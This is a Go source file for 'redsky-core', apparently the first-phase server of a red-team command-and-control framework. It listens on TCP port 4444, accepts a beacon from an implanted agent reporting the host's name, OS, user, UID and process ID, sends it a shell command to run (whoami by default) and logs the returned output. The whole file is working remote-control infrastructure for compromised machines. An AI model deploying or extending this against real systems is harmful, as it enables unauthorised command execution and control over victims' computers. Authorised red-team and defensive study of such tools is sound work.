// redsky-core — the framework. Phase 1: listen on TCP, accept one agent,
// print the beacon, send one task, print the result. No TLS, no encryption,
// no UI yet. This is the proof-of-loop.
package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net"
	"time"

	"github.com/sk666G/red-sky---arsenal/internal/proto"
	"github.com/sk666G/red-sky---arsenal/internal/wire"
)

func main() {
	bind := flag.String("bind", "0.0.0.0", "listen address")
	port := flag.Int("port", 4444, "listen port")
	cmd := flag.String("cmd", "whoami", "command to send to first agent")
	flag.Parse()

	addr := fmt.Sprintf("%s:%d", *bind, *port)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalf("listen: %v", err)
	}
	log.Printf("redsky-core listening on %s", addr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("accept: %v", err)
			continue
		}
		go handleConn(conn, *cmd)
	}
}

func handleConn(conn net.Conn, cmd string) {
	defer conn.Close()
	remote := conn.RemoteAddr().String()
	log.Printf("agent connected from %s", remote)

	// 1. read beacon
	frame, err := wire.ReadFrame(conn)
	if err != nil {
		log.Printf("%s: read frame: %v", remote, err)
		return
	}
	var env proto.Envelope
	if err := json.Unmarshal(frame.Payload, &env); err != nil {
		log.Printf("%s: unmarshal env: %v", remote, err)
		return
	}
	if env.Type != proto.TypeBeacon {
		log.Printf("%s: first message was %s, expected beacon", remote, env.Type)
		return
	}
	var beacon proto.Beacon
	if err := json.Unmarshal(env.Payload, &beacon); err != nil {
		log.Printf("%s: unmarshal beacon: %v", remote, err)
		return
	}
	log.Printf("=== BEACON ===")
	log.Printf("  agent_id: %s", beacon.AgentID)
	log.Printf("  hostname: %s", beacon.Info.Hostname)
	log.Printf("  os/arch:  %s/%s", beacon.Info.OS, beacon.Info.Arch)
	log.Printf("  user:     %s (uid %d)", beacon.Info.User, beacon.Info.UID)
	log.Printf("  pid:      %d", beacon.Info.PID)
	log.Printf("  caps:     %v", beacon.Info.Capabilities)
	log.Printf("  ts:       %s", time.Unix(beacon.TS, 0).Format(time.RFC3339))

	// 2. send task
	task := proto.Task{
		ID:      fmt.Sprintf("t-%d", time.Now().UnixNano()),
		Cmd:     cmd,
		Args:    []string{},
		Timeout: 30,
	}
	if err := sendEnvelope(conn, proto.TypeTask, task); err != nil {
		log.Printf("%s: send task: %v", remote, err)
		return
	}
	log.Printf("sent task %s: %s", task.ID, task.Cmd)

	// 3. read result
	conn.SetReadDeadline(time.Now().Add(45 * time.Second))
	frame, err = wire.ReadFrame(conn)
	if err != nil {
		log.Printf("%s: read result: %v", remote, err)
		return
	}
	if err := json.Unmarshal(frame.Payload, &env); err != nil {
		log.Printf("%s: unmarshal env: %v", remote, err)
		return
	}
	if env.Type != proto.TypeResult {
		log.Printf("%s: expected result, got %s", remote, env.Type)
		return
	}
	var result proto.Result
	if err := json.Unmarshal(env.Payload, &result); err != nil {
		log.Printf("%s: unmarshal result: %v", remote, err)
		return
	}
	log.Printf("=== RESULT ===")
	log.Printf("  task_id:   %s", result.TaskID)
	log.Printf("  exit_code: %d", result.ExitCode)
	log.Printf("  stdout:    %s", result.Stdout)
	if result.Stderr != "" {
		log.Printf("  stderr:    %s", result.Stderr)
	}
	if result.Error != "" {
		log.Printf("  error:     %s", result.Error)
	}
	log.Printf("session closed for %s", remote)
}

func sendEnvelope(conn net.Conn, t proto.MessageType, payload any) error {
	raw, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	env := proto.Envelope{Type: t, Payload: raw}
	envBytes, err := json.Marshal(env)
	if err != nil {
		return err
	}
	return wire.WriteFrame(conn, 0, envBytes)
}
